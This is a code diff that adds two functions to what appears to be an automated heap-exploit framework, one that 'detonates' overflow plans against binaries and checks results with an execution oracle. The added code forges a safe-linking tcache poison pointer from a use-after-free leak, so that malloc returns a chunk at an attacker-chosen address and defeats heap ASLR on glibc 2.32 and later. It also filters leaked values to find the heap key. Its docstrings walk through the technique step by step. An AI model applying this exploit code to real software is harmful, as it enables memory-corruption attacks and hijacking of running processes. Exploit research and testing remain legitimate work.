@@ -133,3 +133,33 @@ def detonate_adjacent_overflow(exe: str, plan: AdjacentOverflowPlan, spec: MenuS
                                 argv=argv, timeout=timeout):
         return False                                     # negative control reached win -> not sound
     return True
+
+
+# ----------------------------------------------------------- leak-consuming safe-linked tcache poison
+def forge_safelink_fd(leaked_fd: int, target: int) -> int:
+    """The fd value to write back into a freed tcache chunk so the allocator hands out `target`
+    next, computed from the heap key the chunk's OWN fd disclosed -- the leak-dependent lowering
+    that makes a safe-linking (glibc >= 2.32) tcache poison ASLR-robust instead of relying on a
+    traced constant.
+
+    Safe-linking stores `mangle(addr, next) = (addr >> 12) ^ next` in a freed chunk's fd. A chunk
+    freed ALONE into a tcache bin has `next == NULL`, so its fd reads back as `(addr >> 12) ^ 0 ==
+    addr >> 12` -- the exact page-shifted key safe-linking XORs with. A use-after-free VIEW of that
+    chunk therefore discloses the key directly, with no knowledge of the chunk's full address. To
+    forge a pointer to `target`, write `leaked_fd ^ target`: the allocator demangles it as
+    `(addr >> 12) ^ (leaked_fd ^ target) == (addr >> 12) ^ ((addr >> 12) ^ target) == target`, so
+    the next-but-one malloc returns a chunk AT `target`. The caller supplies `leaked_fd` from a
+    live in-process leak, so the key is the running process's own -- a real heap-ASLR defeat.
+
+    `target` must be 16-aligned: glibc 2.32+ rejects an unaligned tcache chunk (`_writable_globals`
+    already filters to aligned fn-pointer slots)."""
+    return (leaked_fd ^ target) & 0xFFFFFFFFFFFFFFFF
+
+
+def is_plausible_heap_key(value: int) -> bool:
+    """Whether `value` could be a safe-linking key (a user-space heap address >> 12). A heap chunk
+    sits somewhere under the 47-bit user-space ceiling, so its page-shifted form is a positive
+    value below 2**36 and above a page -- used to pick the fd out of a leak's numeric noise. A loose
+    gate on purpose (a non-PIE brk heap shifts to a small key, e.g. 0x414 with ASLR off): the
+    execution oracle, not this filter, is what rejects a wrong guess."""
+    return 0x100 <= value < (1 << 36)
